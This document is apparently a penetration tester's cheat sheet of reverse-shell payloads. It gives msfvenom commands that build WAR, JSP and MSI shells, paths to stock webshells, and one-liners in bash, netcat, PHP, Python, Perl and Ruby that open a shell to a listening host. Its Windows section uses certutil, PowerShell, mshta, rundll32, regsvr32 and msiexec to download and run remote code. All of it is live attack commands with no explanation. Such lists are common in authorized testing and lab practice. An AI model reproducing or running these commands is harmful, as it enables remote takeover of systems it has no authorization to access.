


## Entry 

````
JSP / tomcat WAR 
msfvenom -p java/shell_reverse_tcp LHOST=10.10.16.127 LPORT=4444 -f war > java4444.war  
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.12 LPORT=4448 -f raw > w4448.jsp 

ASP /ASPX 


PHP 


````
#### WEBSHELLS
````
PHP 
/usr/share/webshells/php/simple-backdoor.php , paramter - cmd 

Cold FUsion 
/usr/share/webshells/cfm/cfexec.cfm

JSP 
/usr/share/webshells/jsp/jsp-reverse.jsp

ASP/ASPX
/usr/share/webshells/asp/
/usr/share/webshells/aspx/

Perl/CGI 
/usr/share/webshells/perl/perl-reverse-shell.pl
/usr/share/webshells/perl/perlcmd.cgi
````


## Linux 

````
bash -i >& /dev/tcp/192.168.119.155/4444 0>&1  

mknod backpipe p && nc 10.10.16.127 4445 0<backpipe | /bin/bash 1>backpipe 

mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i |nc 192.168.119.155 4444 >/tmp/f2 

nc -e /bin/bash 192.168.119.155 4444

````

````
php -r '$sock=fsockopen("10.10.16.127",4446);exec("/bin/sh -i <&3 >&3 2>&3");' 

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.155",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 

perl -e 'use Socket;$i="10.10.14.31";$p=4446;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 

ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
````


## WINDOWS
````
\\192.168.119.155\test\nc.exe -e cmd.exe 192.168.119.155 4444

certutil -urlcache -f http://192.168.119.155/nc.exe nc.exe & nc.exe -e cmd.exe 192.168.119.155 4444

start /B \\192.168.119.155\test\nc.exe -e cmd.exe 192.168.119.155 4444 

powershell -exec bypass -c "iwr('http://192.168.119.155/Invoke-PowerShellTcp.ps1')|iex"

powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.119.155/Invoke-PowerShellTcp.ps1')"


````


````
certutil -urlcache -f http://192.168.119.155/shell.exe shell.exe & shell.exe 

mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta 

rundll32.exe \\192.168.1.109\vabFG\test.dll,0 

regsvr32 /s /n /u /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll 

powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))" 

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi 
msiexec /q /i http://192.168.1.109/1.msi 

````
